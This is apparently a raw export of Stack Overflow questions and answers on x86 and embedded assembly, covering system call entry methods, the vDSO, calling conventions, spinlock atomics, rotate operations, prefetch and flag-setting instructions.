<p>EDIT: Linux irrelevant parts removed</p>

<p>While not totally wrong narrowing down to <code>int 0x80</code> and <code>syscall</code> oversimplifies the question as with sysenter there is at least a 3rd option.</p>

<p>Using 0x80 and eax for <code>syscall</code> number, ebx, ecx, edx, esi, edi, and ebp to pass parameters is just one of many possible other choices to implement a system call.</p>

<p>Before taking a closer look at the techniques involved, it should be stated that they all circle around the problem of escaping the privilege prison every process runs in. </p>

<p>Another choice to the ones presented here offered by the x86 architecture would have been the use of a call gate (see: <a href=""http://en.wikipedia.org/wiki/Call_gate"" rel=""noreferrer"">http://en.wikipedia.org/wiki/Call_gate</a>)</p>

<p>The only other possibility present on all i386 machines is using a software interrupt, which allows the ISR to run in a different privilege level than before.</p>

<h2>Software Interrupt</h2>

<p>What exactly happens once an interrupt is triggered depends on whether switching to the ISR requires a privilege change or not:</p>

<p>(Intel® 64 and IA-32 Architectures Software Developer’s Manual)</p>

<blockquote>
  <p>6.4.1 Call and Return Operation for Interrupt or Exception Handling Procedures</p>
  
  <p>... </p>
  
  <p>If the code segment for the handler procedure has the
  same privilege level as the currently executing program or task, the
  handler procedure uses the current stack; if the handler executes at a
  more privileged level, the processor switches to the stack for the
  handler’s privilege level.</p>
  
  <p>....</p>
  
  <p>If a stack switch does occur, the processor does the following:</p>
  
  <ol>
  <li><p>Temporarily saves (internally) the current contents of the SS, ESP, EFLAGS, CS, and > EIP registers.</p></li>
  <li><p>Loads the segment selector and stack pointer for the new stack (that is, the stack for the privilege level being
  called) from the TSS into the SS and ESP registers and switches to the new stack.</p></li>
  <li><p>Pushes the temporarily saved SS, ESP, EFLAGS, CS, and EIP values for the interrupted procedure’s stack onto
   the new stack.</p></li>
  <li><p>Pushes an error code on the new stack (if appropriate).</p></li>
  <li><p>Loads the segment selector for the new code segment and the new instruction pointer (from the interrupt gate
   or trap gate) into the CS and EIP registers, respectively.</p></li>
  <li><p>If the call is through an interrupt gate, clears the IF flag in the EFLAGS register.</p></li>
  <li><p>Begins execution of the handler procedure at the new privilege level. </p></li>
  </ol>
</blockquote>

<p>... sigh this seems to be a lot to do and even once we're done it doesn't get too much better:</p>

<p>(excerpt taken from the same source as mentioned above: Intel® 64 and IA-32 Architectures Software Developer’s Manual)</p>

<blockquote>
  <p>When executing a return from an interrupt or exception handler from a
  different privilege level than the interrupted procedure, the
  processor performs these actions:</p>
  
  <ol>
  <li><p>Performs a privilege check.</p></li>
  <li><p>Restores the CS and EIP registers to their values prior to the interrupt or exception.</p></li>
  <li><p>Restores the EFLAGS register.</p></li>
  <li><p>Restores the SS and ESP registers to their values prior to the interrupt or exception, resulting in a stack switch    back to the
  stack of the interrupted procedure.</p></li>
  <li><p>Resumes execution of the interrupted procedure.</p></li>
  </ol>
</blockquote>

<h2>Sysenter</h2>

<p>Another option on the 32-bit platform not mentioned in your question at all, but nevertheless utilized by the Linux kernel is the <code>sysenter</code> instruction.</p>

<p>(Intel® 64 and IA-32 Architectures Software Developer’s Manual Volume 2 (2A, 2B &amp; 2C): Instruction Set Reference, A-Z)</p>

<blockquote>
  <p>Description Executes a fast call to a level 0 system procedure or
  routine. SYSENTER is a companion instruction to SYSEXIT. The
  instruction is optimized to provide the maximum performance for system
  calls from user code running at privilege level 3 to operating system
  or executive procedures running at privilege level 0.</p>
</blockquote>

<p>One disadvantage of using this solution is, that it is not present on all 32-bit machines, so the <code>int 0x80</code> method still has to be provided in case the CPU doesn't know about it.</p>

<blockquote>
  <p>The SYSENTER and SYSEXIT instructions were introduced into the IA-32
  architecture in the Pentium II processor. The availability of these
  instructions on a processor is indicated with the SYSENTER/SYSEXIT
  present (SEP) feature flag returned to the EDX register by the CPUID
  instruction. An operating system that qualifies the SEP flag must also
  qualify the processor family and model to ensure that the
  SYSENTER/SYSEXIT instructions are actually present</p>
</blockquote>

<h2>Syscall</h2>

<p>The last possibility, the <code>syscall</code> instruction, pretty much allows for the same functionality as the <code>sysenter</code> instruction. The existence of both is due to the fact that one (<code>systenter</code>) was introduced by Intel while the other (<code>syscall</code>) was introduced by AMD.</p>

<h2>Linux specific</h2>

<p>In the Linux kernel any of the three possibilities mentioned above may be chosen to realize a system call.</p>

<p>As already stated above, the <code>int 0x80</code> method is the only one of the 3 chosen implementations, that can run on any i386 CPU so this is the only one that is always available.</p>

<p>To allow to switch between all 3 choices every process run is given access to a special shared object that gives access to the system call implementation chosen for the running system. This is the strange looking <code>linux-gate.so.1</code> you already might have encountered as unresolved library when using <code>ldd</code> or the like.</p>

<p>(arch/x86/vdso/vdso32-setup.c)</p>

<pre><code> if (vdso32_syscall()) {                                                                               
        vsyscall = &amp;vdso32_syscall_start;                                                                 
        vsyscall_len = &amp;vdso32_syscall_end - &amp;vdso32_syscall_start;                                       
    } else if (vdso32_sysenter()){                                                                        
        vsyscall = &amp;vdso32_sysenter_start;                                                                
        vsyscall_len = &amp;vdso32_sysenter_end - &amp;vdso32_sysenter_start;                                     
    } else {                                                                                              
        vsyscall = &amp;vdso32_int80_start;                                                                   
        vsyscall_len = &amp;vdso32_int80_end - &amp;vdso32_int80_start;                                           
    }   
</code></pre>

<p>To utilize it all you have to do is load all your registers system call number in eax, parameters in ebx, ecx, edx, esi, edi as with <code>int 0x80</code> system call implementation and <code>call</code> the main routine.</p>

<p>Unfortunately it is not all that easy, as to minimize the security risk of a fixed predefined address the location at which the <code>vdso</code> will be visible in a process is randomized, so you will have to figure out the correct location first.</p>

<p>This address individual to each process is passed to it, once it is started.</p>

<p>In case you didn't know, when started in Linux, every process gets pointers to the parameters passed once it was started and pointers to a description of the environment variables it is running under passed on its stack - each of them terminated by NULL.</p>

<p>Additionally to these a third block of so called elf-auxiliary-vectors gets passed following the ones mentioned before. The correct location is encoded in one of these carrying the type-identifier <code>AT_SYSINFO</code>.</p>

<p>So stack layout looks like this:</p>

<ul>
<li>parameter-0</li>
<li>...</li>
<li>parameter-m</li>
<li>NULL</li>
<li>environment-0</li>
<li>....</li>
<li>environment-n</li>
<li>NULL</li>
<li>...</li>
<li>auxilliary elf vector:  <code>AT_SYSINFO</code></li>
<li>...</li>
<li>auxilliary elf vector:  <code>AT_NULL</code> </li>
</ul>

<h2>Usage example</h2>

<p>To find the correct address you will have to first skip all arguments and all environment pointers and then start scanning for <code>AT_SYSINFO</code> as shown in the example below:</p>

<pre><code>#include &lt;stdio.h&gt;
#include &lt;elf.h&gt;

void putc_1 (char c) {
  __asm__ (""movl $0x04, %%eax\n""
           ""movl $0x01, %%ebx\n""
           ""movl $0x01, %%edx\n""
           ""int $0x80""
           :: ""c"" (&amp;c)
           : ""eax"", ""ebx"", ""edx"");
}

void putc_2 (char c, void *addr) {
  __asm__ (""movl $0x04, %%eax\n""
           ""movl $0x01, %%ebx\n""
           ""movl $0x01, %%edx\n""
           ""call *%%esi""
           :: ""c"" (&amp;c), ""S"" (addr)
           : ""eax"", ""ebx"", ""edx"");
}


int main (int argc, char *argv[]) {

  /* using int 0x80 */
  putc_1 ('1');


  /* rather nasty search for jump address */
  argv += argc + 1;     /* skip args */
  while (*argv != NULL) /* skip env */
    ++argv;            

  Elf32_auxv_t *aux = (Elf32_auxv_t*) ++argv; /* aux vector start */

  while (aux-&gt;a_type != AT_SYSINFO) {
    if (aux-&gt;a_type == AT_NULL)
      return 1;
    ++aux;
  }

  putc_2 ('2', (void*) aux-&gt;a_un.a_val);

  return 0;
}
</code></pre>

<p>As you will see by taking a look at the following snippet of <code>/usr/include/asm/unistd_32.h</code> on my system:</p>

<pre><code>#define __NR_restart_syscall 0
#define __NR_exit            1
#define __NR_fork            2
#define __NR_read            3
#define __NR_write           4
#define __NR_open            5
#define __NR_close           6
</code></pre>

<p>The syscall I used is the one numbered 4 (write) as passed in the eax register.
Taking filedescriptor (ebx = 1), data-pointer (ecx = &amp;c) and size (edx = 1) as its arguments, each passed in the corresponding register.</p>

<h2>To put a long story short</h2>

<p>Comparing a supposedly slow running <code>int 0x80</code> system call on <em>any</em> Intel CPU with a (hopefully) much faster implementation using the (genuinely invented by AMD) <code>syscall</code> instruction is comparing apples to oranges. </p>

<p>IMHO: Most probably the <code>sysenter</code> instruction instead of <code>int 0x80</code> should be to the test here.</p>
","15169141"
"How Do Assemblers Map x86 Instruction Mnemonics to Binary Machine Instructions?","6095","","<p>I'm interested in writing an x86 assembler. I'm wondering what is a good way to map x86 assembly mnemonic instructions (using an Intel-like syntax) into the corresponding binary machine code instructions.</p>
","<p>Do you want to understand the physical mapping of mnemonics to machine code? If so volume 2A &amp; 2B of the the <a href=""https://software.intel.com/en-us/articles/intel-sdm"" rel=""nofollow noreferrer"">Intel IA32/IA64 reference manuals</a> describe the binary format of x86 machine code .</p>

<p>The <a href=""http://en.wikipedia.org/wiki/X86_instruction_listings"" rel=""nofollow noreferrer"">x86 instruction set page</a> on Wikipedia has a compact listing of all the instructions categorized by when they were introduced, which might help you prioritize what to implement first.</p>

<p>However, if you are asking about how to go about parsing an assembly code text file to get to the point where your program could start writing out machine code then you basically need to understand how to write a compiler. The tools lex and yacc are good places to start but if you don't know how build a compiler you'll also need to get a book. I think the <a href=""http://en.wikipedia.org/wiki/Compilers%3a_Principles%2C_Techniques%2C_and_Tools"" rel=""nofollow noreferrer"">Dragon book</a> is the best one out there but there are any number of other books you could use, SO has plenty of recommendations.</p>
","2760607"
"push local variables","6089","","<p>Alo</p>

<p>After I have read about function and stack from <a href=""http://en.wikibooks.org/wiki/X86_Disassembly/Functions_and_Stack_Frames"" rel=""noreferrer"">http://en.wikibooks.org/wiki/X86_Disassembly/Functions_and_Stack_Frames</a> I have a question about local variables.</p>

<p>Snapshot from the article:</p>

<hr>

<pre><code>push ebp     ; save the value of ebp
mov ebp, esp ; ebp now points to the top of the stack
sub esp, 12  ; space allocated on the stack for the local variables
</code></pre>

<p>This means local variables can be accessed by referencing ebp. Consider the following C code fragment and corresponding assembly code:</p>

<pre><code>a = 10;
b = 5;
c = 2;

mov [ebp -  4], 10  ; location of variable a
mov [ebp -  8], 5   ; location of b
mov [ebp - 12], 2   ; location of c
</code></pre>

<p>Remember that pushing basically does this:</p>

<pre><code>sub esp, 4   ; ""allocate"" space for the new stack item
mov [esp], X ; put new stack item value X in
</code></pre>

<p><hr>
Why are local variables not push into the stack like this:</p>

<pre><code>push 10
push 5
push 2
</code></pre>

<p>instead of </p>

<pre><code>sub esp, 12

mov [ebp -  4], 10  ; location of variable a
mov [ebp -  8], 5   ; location of b
mov [ebp - 12], 2   ; location of c
</code></pre>
","<p>It's more a matter of semantics rather than of technical correctness: <code>push</code> and <code>pop</code> are used to save and restore registers or values; but providing <strong>local variables</strong> for a function does not correspond to this regular purpose of <code>push</code>/<code>pop</code>. So, the stack is managed manually here (except of <code>push ebp</code> and <code>pop ebp</code>, because here we actually want to save and restore <code>ebp</code> in the true sense of <code>push</code>/<code>pop</code>).</p>
","4308113"
"How to port pgm_read_byte macro (AVR-GCC) to Mircrochip C18 Compiler?","6072","","<p>I'm porting the <a href=""http://en.radzio.dxp.pl/t6963/"" rel=""nofollow"">T6963-based LCD driver</a> from AVR-GCC to the microchip C18 compiler. I have seen the macro ""<a href=""http://www.nongnu.org/avr-libc/user-manual/group__avr__pgmspace.html"" rel=""nofollow"">pgm_read_byte</a>"": does anyone know how to port this macro?</p>

<p><strong>UPDATE</strong></p>

<p>From <a href=""http://www.koders.com/c/fidE0465E75E0EDBBCF1855F09FF4A43B8518C4346D.aspx"" rel=""nofollow"">here</a> I can see the implementation of the macro</p>

<pre><code>#define   pgm_read_byte(address_short)
pgm_read_byte_near(address_short)
...
#define   pgm_read_byte_near(address_short)   __LPM((uint16_t)(address_short))
...
#define   __LPM(addr)                         __LPM_enhanced__(addr)
...
#define __LPM_enhanced__(addr)  \
(__extension__({                \
    uint16_t __addr16 = (uint16_t)(addr); \
    uint8_t __result;           \
    __asm__                     \
    (                           \
        ""lpm %0, Z"" ""\n\t""      \
        : ""=r"" (__result)       \
        : ""z"" (__addr16)        \
    );                          \
    __result;                   \
}))
</code></pre>
","<p>According to the link you posted, the macro is defined as:</p>

<pre><code>#define   pgm_read_byte(address_short)        pgm_read_byte_near(address_short)
#define   pgm_read_byte_near(address_short)   __LPM((uint16_t)(address_short))
</code></pre>

<p>Those macros should be portable without any problems, they're simply aliasing the names of other functions/macros.  What <em>specifically</em> are you having trouble with?  What have you tried so far, and what went wrong?</p>
","10989363"
"MSP430 JC, JNC , JEQ and JNZ","6065","","<p>I was looking through the MSP430's instruction set and stumbled upon something I can't quite understand. I can't seem to differentiate what the difference between JC and JNZ and JNC and JEQ. I understand the functions of JEQ and JNZ, but I'm a Little fuzzy on the usage of JC and JNC.</p>

<p>I know for a fact JC and JNC utilize the carry flag, but I'm not sure in what way it's used and how they differ from JNZ and JEQ.</p>
","<pre><code>JC = Jump if carry set (C=1)
JNC = Jump if carry is not set (C=0)
JZ = Jump if zero-flag is set
JNZ = Jump if zero-flag is not set

JEQ = Jump if equal =&gt; another 'name' for JZ
(There are many instruction aliases').
</code></pre>

<p>When you add two numbers with highest bit set, you'd end up with result with one bit longer that the original numbers. This new bit ""goes"" to carry. It's also used as borrow-flag in subtractions. Compare is the same as subtraction except that the result value is not stored.</p>

<p>That's what SBC does to the flags:</p>

<pre><code>Status Bits N: Set if result is negative, reset if positive
Z: Set if result is zero, reset otherwise
C: Set if there is a carry from the MSB of the result, reset otherwise.
Set to 1 if no borrow, reset if borrow.
V: Set if an arithmetic overflow occurs, reset otherwise.
</code></pre>
","26415711"
"How is thread synchronization implemented, at the assembly language level?","6055","","<p>While I'm familiar with concurrent programming concepts such as mutexes and semaphores, I have never understood how they are implemented at the assembly language level.</p>

<p>I imagine there being a set of memory ""flags"" saying:</p>

<ul>
<li>lock A is held by thread 1</li>
<li>lock B is held by thread 3</li>
<li>lock C is not held by any thread</li>
<li>etc</li>
</ul>

<p>But how is access to these flags synchronized between threads? Something like this naive example would only create a race condition:</p>

<pre><code>  mov edx, [myThreadId]
wait:
  cmp [lock], 0
  jne wait
  mov [lock], edx
  ; I wanted an exclusive lock but the above 
  ; three instructions are not an atomic operation :(
</code></pre>
","<ul>
<li>In practice, these tend to be implemented with <a href=""http://en.wikipedia.org/wiki/Compare-and-swap"" rel=""noreferrer"">CAS</a> and <a href=""http://en.wikipedia.org/wiki/Load-Link/Store-Conditional"" rel=""noreferrer"">LL/SC</a>.
(...and some spinning before giving up the time slice of the thread - usually by calling into a kernel function that switches context.)</li>
<li>If you only need a <a href=""http://en.wikipedia.org/wiki/Spinlock"" rel=""noreferrer"">spinlock</a>, wikipedia gives you an example which trades CAS for lock prefixed <code>xchg</code> on x86/x64. So in a strict sense, a CAS is not needed for crafting a spinlock - but some kind of atomicity is still required. In this case, it makes use of an atomic operation that can write a register to memory and return the previous contents of that memory slot in a <em>single step</em>. (To clarify a bit more: the <em>lock</em> prefix asserts the #LOCK signal that ensures that the current CPU has exclusive access to the memory. On todays CPUs it is not necessarily carried out this way, but the effect is the same. By using <code>xchg</code> we make sure that we will not get preempted somewhere between reading and writing, since instructions will not be interrupted half-way. So if we had an imaginary <em>lock mov reg0, mem / lock mov mem, reg1</em> pair (which we don't), that would not quite be the same - it could be preempted just between the two movs.)</li>
<li>On current architectures, as pointed out in the comments, you mostly end up using the atomic primitives of the CPU and the coherency protocols provided by the memory subsystem.</li>
<li>For this reason, you not only have to use these primitives, but also account for the cache/memory coherency guaranteed by the architecture.</li>
<li>There may be implementation nuances as well. Considering e.g. a spinlock:

<ul>
<li>instead of a naive implementation, you should probably use e.g. a <a href=""http://www.cs.brown.edu/courses/cs176/ch07.ppt"" rel=""noreferrer"">TTAS spin-lock with some exponential backoff</a>, </li>
<li>on a Hyper-Threaded CPU, you should probably issue <code>pause</code> instructions that serve as  hints that you're spinning - so that the core you are running on can do something useful during this</li>
<li>you should really give up on spinning and yield control to other threads after a while</li>
<li>etc...</li>
</ul></li>
<li>this is still user mode - if you are writing a kernel, you might have some other tools that you can use as well (since you are the one that schedules threads and handles/enables/disables interrupts).</li>
</ul>
","2368183"
"How to perform rotate shift in C","6053","","<p>I have a question as described: how to perform rotate shift in C without embedded assembly. To be more concrete, how to rotate shift a 32-bit <code>int</code>.</p>

<p>I'm now solving this problem with the help of type <code>long long int</code>, but I think it a little bit ugly and wanna know whether there is a more elegant method.</p>

<p>Kind regards.</p>
","<p>(warning to future readers): Wikipedia's code produces sub-optimal asm (gcc includes a branch or cmov).  See <a href=""https://stackoverflow.com/questions/776508/circular-shift-rotate-operations-in-c"">Best practices for circular shift (rotate) operations in C++</a> for efficient UB-free rotates.</p>

<hr>

<p>From <a href=""http://en.wikipedia.org/wiki/Circular_shift"" rel=""nofollow noreferrer"">Wikipedia</a>:</p>

<pre><code>unsigned int _rotl(unsigned int value, int shift) {
    if ((shift &amp;= 31) == 0)
      return value;
    return (value &lt;&lt; shift) | (value &gt;&gt; (32 - shift));
}

unsigned int _rotr(unsigned int value, int shift) {
    if ((shift &amp;= 31) == 0)
      return value;
    return (value &gt;&gt; shift) | (value &lt;&lt; (32 - shift));
}
</code></pre>
","2835503"
"The prefetch instruction","6053","","<p>It appears the general logic for prefetch usage is that prefetch can be added, provided the code is busy in processing until the prefetch instruction completes its operation. But, it seems that if too much of prefetch instructions are used, then it would impact the performance of the system. I find that we need to first have the working code without prefetch instruction. Later we need to various combination of prefetch instruction in various locations  of code and do analysis to determine the code locations that could actually improve because of prefetch. Is there any better way to determine the exact locations in which the prefetch instruction should be used ?</p>
","<p>In the majority of cases prefetch instructions are of little or no benefit, and can even be counter-productive in some cases. Most modern CPUs have an automatic prefetch mechanism which works well enough that adding software prefetch hints achieves little, or even interferes with automatic prefetch, and can actually reduce performance.</p>

<p>In some rare cases, such as when you are streaming large blocks of data on which you are doing very little actual processing, you may manage to hide some latency with software-initiated prefetching, but it's very hard to get it right - you need to start the prefetch several hundred cycles before you are going to be using the data - do it too late and you still get a cache miss, do it too early and your data may get evicted from cache before you are ready to use it. Often this will put the prefetch in some unrelated part of the code, which is bad for modularity and software maintenance. Worse still, if your architecture changes (new CPU, different clock speed, etc), such that DRAM access latency increases or decreases, you may need to move your prefetch instructions to another part of the code to keep them effective.</p>

<p>Anyway, if you feel you really must use prefetch, I recommend #ifdefs around any prefetch instructions so that you can compile your code with and without prefetch and see if it is actually helping (or hindering) performance, e.g.</p>

<pre><code>#ifdef USE_PREFETCH
    // prefetch instruction(s)
#endif
</code></pre>

<p>In general though, I would recommend leaving software prefetch on the back burner as a last resort micro-optimisation after you've done all the more productive and obvious stuff.</p>
","3123012"
"What does this assembly code do? (TEST,XOR,JNZ)","6041","","<p>1.</p>

<pre><code>TEST EAX,EAX
JNZ SHORT program.00407190
</code></pre>

<p>2.</p>

<pre><code>XOR EAX,EAX
JNZ SHORT program.00407190
</code></pre>

<p>Kindly correct me if I'm wrong. Thank you! :)</p>

<p>From my understanding so far:</p>

<p><code>JNZ</code> is jump if not equal to zero, it will jump or not depending on whether <code>ZF</code> is set to 1 or not. If it's 1, it will not jump. Else, it will jump.</p>

<p>From my understanding for code #1, <code>TEST EAX,EAX</code> will check whether it's zero or not. If it's not equal to zero(<code>ZF</code> is 0), it will jump to address 00407190.</p>

<p>For code #2 <br>
<code>XOR EAX,EAX</code> will set EAX register to 0. Does it set any flags? If not, how does <code>JNZ</code> instruction determine to jump or not?</p>

<p>Lastly, why would people want to check if <code>EAX</code> is 0 or not? Kindly please assist me in a easier and detailed explanation, I'm still a beginner. </p>
","<p><code>TEST</code> and <code>XOR</code> are logical instructions used to perform logical operations on the operands.</p>

<p><strong>TEST INSTRUCTION</strong> (comparing the operands)</p>

<pre><code>TEST destiny, source
</code></pre>

<p>It performs a conjunction, bit by bit, of the operands, but differing from <code>AND</code>, this instruction does not place the result in the destination operand, it only has effect on the state of the flags.</p>

<pre><code>Source Destiny | Destiny
--------------------------
1      1       | 1      
1      0       | 0
0      1       | 0
0      0       | 0    &lt;---
</code></pre>

<hr>

<p><strong>XOR INSTRUCTION</strong> (Exclusive OR)</p>

<pre><code>XOR destiny, source 
</code></pre>

<p>Its function is to perform the logical exclusive disjunction of the two operands bit by bit.</p>

<pre><code>Source Destiny | Destiny
--------------------------
1      1       | 0    &lt;---
1      0       | 1
0      1       | 1
0      0       | 0    &lt;---
</code></pre>

<hr>

<p>As you see in the tables:</p>

<p><code>XOR EAX,EAX</code> will set the <code>EAX</code> register to zero. The <code>ZF</code> will be set if the result of the <code>XOR</code> is zero. So in this case: (<code>ZF=1</code>) </p>

<p><code>TEST EAX,EAX</code> does not place the result on the register, it only has effect on the state of the <code>ZF</code>. In this case if <code>EAX == 0</code>, then (<code>ZF=1</code>)</p>

<hr>

<p><strong>JNZ (JNE) INSTRUCTION</strong> (Conditional jump)</p>

<pre><code>JNZ label
</code></pre>

<p>It jumps to <code>label</code> if it is not equal or zero. The jump will be done if <code>ZF</code> is deactivated. (<code>ZF=0</code>)</p>
","18996962"
"Is size of char * same as size of int *?","6038","","<p>I know:
char * is a pointer to char.
and
int * is a pointer to int.</p>

<p>So, i want to confirm following two things:</p>

<ol>
<li><p>So now suppose I am on 32 bit machine, then that means memory addresses are 32 bit wide.
Thus that means size of char * and int * is both 32 bits ( 4 bytes), right ?
Also is size of char * * also same as size of int * ?</p></li>
<li><p>suppose I have:
int * ptr;</p></li>
</ol>

<p>Thus now doing *((char * *) ptr) = 0x154 is same as *((int *) ptr) = 0x514 same, right ?
( 0x514 is just any random memory address)</p>

<p>Platform: I am on x86.</p>

<p>P.S.: I know type casting is not a suggested way to code. But I am doing Kernel coding, thus I HAVE TO do type casting !</p>
","<p>In C pointers are <a href=""http://c-faq.com/null/machexamp.html"" rel=""nofollow"">not guaranteed to have the same size</a>.  Now in reality most implementations pointers will be the same size, but that is an implementation detail of the compiler.</p>

<p>From the <a href=""http://c-faq.com/null/machexamp.html"" rel=""nofollow"">C Faq</a>:</p>

<blockquote>
  <p>The old HP 3000 series uses a different addressing scheme for byte
  addresses than for word addresses; like several of the machines above
  it therefore uses different representations for char * and void *
  pointers than for other pointers</p>
  
  <p>Depending on the ``memory model'' in use, 8086-family processors (PC
  compatibles) may use 16-bit data pointers and 32-bit function
  pointers, or vice versa.</p>
</blockquote>

<p>Also <code>*((char *)ptr) = 0x154</code> is not the same as <code>*((int *)ptr) = 0x154</code>.  Because you are dereferencing the pointer you will write data the size of a <code>char</code> and the size of an <code>int</code> into the location pointed to by <code>ptr</code>.  Assuming an 8 bit char and a 32 bit int, <code>*((char *)ptr) = 0x154</code> will write<code>0x154</code> to the memory address assigned to <code>ptr</code> and  <code>*((int *)ptr) = 0x154</code>  will write <code>0x0000000154</code> to the 4 bytes starting at the address assigned to <code>ptr</code>.</p>
","14913177"
"xorl %eax, %eax in x86_64 assembly code produced by gcc","6025","","<p>I'm a total noob at assembly, just poking around a bit to see what's going on.  Anyway, I wrote a very simple function:</p>

<pre><code>void multA(double *x,long size)
{
  long i;
  for(i=0; i&lt;size; ++i){
    x[i] = 2.4*x[i];
  }
}
</code></pre>

<p>I compiled it with:</p>

<pre><code>gcc -S -m64 -O2 fun.c
</code></pre>

<p>And I get this:</p>

<pre><code>    .file   ""fun.c""
    .text
    .p2align 4,,15
    .globl  multA
    .type   multA, @function
multA:
.LFB34:
    .cfi_startproc
    testq   %rsi, %rsi
    jle .L1
    movsd   .LC0(%rip), %xmm1
    xorl    %eax, %eax
    .p2align 4,,10
    .p2align 3
.L3:
    movsd   (%rdi,%rax,8), %xmm0
    mulsd   %xmm1, %xmm0
    movsd   %xmm0, (%rdi,%rax,8)
    addq    $1, %rax
    cmpq    %rsi, %rax
    jne .L3
.L1:
    rep
    ret
    .cfi_endproc
.LFE34:
    .size   multA, .-multA
    .section    .rodata.cst8,""aM"",@progbits,8
    .align 8
.LC0:
    .long   858993459
    .long   1073951539
    .ident  ""GCC: (Ubuntu/Linaro 4.6.3-1ubuntu5) 4.6.3""
    .section    .note.GNU-stack,"""",@progbits
</code></pre>

<p>The assembly output makes sense to me (mostly) except for the line <code>xorl %eax, %eax</code>.  From googling, I gather that the purpose of this is simply to set <code>%eax</code> to zero, which in this case corresponds to my iterator <code>long i;</code>.</p>

<p>However, unless I am mistaken, <code>%eax</code> is a 32-bit register.  So it seems to me that this should actually be <code>xorq %rax, %rax</code>, particularly since this is holding a 64-bit long int.  Moreover, further down in the code, it actually uses the 64-bit register <code>%rax</code> to do the iterating, which never gets initialized outside of <code>xorl %eax %eax</code>, which would seem to only zero out the lower 32 bits of the register.</p>

<p>Am I missing something?</p>

<p>Also, out of curiosity, why are there two <code>.long</code> constants there at the bottom?  The first one, <code>858993459</code> is equal to the double floating-point representation of <code>2.4</code> but I can't figure out what the second number is or why it is there.</p>
","<blockquote>
  <p>I gather that the purpose of this is simply to set %eax to zero</p>
</blockquote>

<p>Yes.</p>

<blockquote>
  <p>which in this case corresponds to my iterator long i;.</p>
</blockquote>

<p>No. Your <code>i</code> is uninitialized in the declaration. Strictly speaking, that operation corresponds to the <code>i = 0</code> expression in the for loop.</p>

<blockquote>
  <p>However, unless I am mistaken, %eax is a 32-bit register. So it seems to me that this should actually be xorq %rax, %rax, particularly since this is holding a 64-bit long int.</p>
</blockquote>

<p>But clearing the lower double word of the register clears the entire register. This is not intuitive, but it's implicit.</p>
","19082183"
"Function parameters transferred in registers on 64bit OS?","6014","","<p>I am reading one of Agner Fog's manuals and as an advantage for 64 bit Operating Systems (over 32 bit) he says:</p>

<blockquote>
  <p>Function parameters are transferred in registers rather than on the
  stack. This makes function calls more efficient.</p>
</blockquote>

<p>Is he saying the stack is not used for passing function parameters (64bit OS) at all???</p>
","<p>Yes, that's what he's saying, but it's not quite accurate.  The stack <em>may</em> be used, but only if your function has a <em>lot</em> of parameters (or you write code that forces a spill).</p>

<p>If you check out the <a href=""http://en.wikipedia.org/wiki/X86_calling_conventions#x86-64_calling_conventions"" rel=""noreferrer"">wikipedia list of 64-bit intel calling conventions</a>, you'll see that registers are used to pass the first several parameters.  There are two major 64-bit Intel calling conventions.  For the Microsoft ABI:</p>

<blockquote>
  <p>The Microsoft x64 calling convention uses registers RCX, RDX, R8, R9 for the first four integer or pointer arguments (in that order left to right), and XMM0, XMM1, XMM2, XMM3 are used for floating point arguments. Additional arguments are pushed onto the stack (right to left). Integer return values (similar to x86) are returned in RAX if 64 bits or less. Floating point return values are returned in XMM0. Parameters less than 64 bits long are not zero extended; the high bits contain garbage.</p>
</blockquote>

<p>And the System V ABI:</p>

<blockquote>
  <p>The first six integer or pointer arguments are passed in registers RDI, RSI, RDX, RCX, R8, and R9, while XMM0, XMM1, XMM2, XMM3, XMM4, XMM5, XMM6 and XMM7 are used for floating point arguments ... As in the Microsoft x64 calling convention, additional arguments are passed on the stack and the return value is stored in RAX.</p>
</blockquote>
","17437200"
"How to use the ADD instruction with SIGNED integers in Assembly 8086?","6011","","<p>So if I wanted to add two unsigned ints I would simply write</p>

<pre><code>dat1 db ff
dat2 db ff
res dw ?
</code></pre>

<p>and in the code segment:</p>

<pre><code>mov ax, dat1
add ax, dat2
mov dl,0
adc dl,0 ;initialize the contents of dl and use it to store the carry flag
mov byte ptr res, ax
mov byte ptr res+1, dl
</code></pre>

<p>BUT, what would the code look like if I wanted to add two SIGNED integers? Can I somehow access the sign flag?</p>
","<p>First the errors:</p>

<ul>
<li>It reads 16 bits from variables that allocate only 8 bits. </li>
<li>It doesn't make sense to write to address res+1 either (but to res+2).</li>
<li>also trying to write <code>mov byte ptr addr, ax</code> should fail
<ul>
<li>should be <code>mov word ptr res, ax</code></li>
</ul></li>
</ul>

<p>Answer to the first question is: nothing special.<br>
<code>add ax, bx</code> doesn't care if they are signed or not. The fun part comes when inspecting the status register. There you have the <em>carry flag</em>, <em>sign flag</em> and <em>overflow flag</em>. (and 25+ unrelated flags). As a side note: overflow flag is set, if carry_flag != sign_flag <em>for addends of the same sign</em>. It means that addition/subtraction of two negative numbers can be interpreted positive or adding two positive numbers can be <em>interpreted</em> as negative. For addends of different sign (3) + (-2) overflow doesn't happen.</p>

<p>Sign flag can be accessed by comparing and branching:</p>

<pre><code>add ax,bx  
jns process_unsigned   // or
js process_signed  
</code></pre>

<p>Or if you are concerned to transfer the sign bit of a register somewhere else, you can<br>
 - <code>mov cl, 16; sar ax, cl;</code>  // shift the sign bit over the word ax  <strong><em>or</em></strong><br>
 - <code>add ax, ax</code> (<em>or</em> <code>shl ax,1</code>)  // shift the sign bit out of the ""left"" side of AX to <em>Carry Bit</em>  </p>

<p>Additionally one can <code>pushf</code> <a href=""http://en.wikipedia.org/wiki/FLAGS_register"" rel=""nofollow"">status flag</a>, <code>pop ax</code> it to a general purpose register, and inspect any individual bits.</p>
","13495661"
"Pointer Deferencing in x86 Assembly Code","6010","","<p>I'm reading my textbook and it has code for a swap function:</p>

<p>In C:</p>

<pre><code>int exchange(int *xp, int y) {
 int x = *xp;
 *xp = y;
 return x; 
}
</code></pre>

<p>In x86 Assembly with annotations:</p>

<pre><code>// xp is at %ebp + 8, y at %ebp + 12
movl 8(%ebp), %edx      // get xp
movl (%edx), %eax       // get x at xp
movl 12(%ebp), %ecx     // get y
movl %ecx, (%edx)       // store y at xp
</code></pre>

<p>So from my understanding, if the int* xp pointed to an int I at address A, then the first line of assembly code stores A at %edx. Then it gets dereferenced in the second line and stored at %eax.</p>

<p>If this is true, I'm wondering why line 1's ""8(%ebp)"" doesn't dereference the pointer, storing the int I in %edx instead of the address A? Isn't that what parentheses do in assembly? </p>

<p>Or does that mean that when pointers are pushed onto the stack, the address of the pointer is pushed on rather than the value it holds so 8(%ebp) technically holds &amp;xp?</p>

<p>Just wanted to clarify if my understanding was correct. </p>
